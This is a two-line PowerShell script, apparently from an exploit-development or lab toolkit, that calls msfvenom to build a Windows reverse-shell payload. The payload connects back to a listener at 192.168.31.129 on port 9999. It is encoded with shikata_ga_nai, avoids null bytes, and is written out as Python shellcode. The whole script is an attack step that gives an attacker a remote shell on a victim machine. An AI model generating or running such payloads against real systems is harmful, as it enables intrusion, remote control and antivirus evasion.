Write-Host "Generating Reverse-Shell Payload..."

.\external-tools\Custom-Compacted-MSF\bin\msfvenom.bat -p windows/shell_reverse_tcp LHOST=192.168.31.129 LPORT=9999 -b '\x00' -e x86/shikata_ga_nai -f py -o .\scripts\payload.txt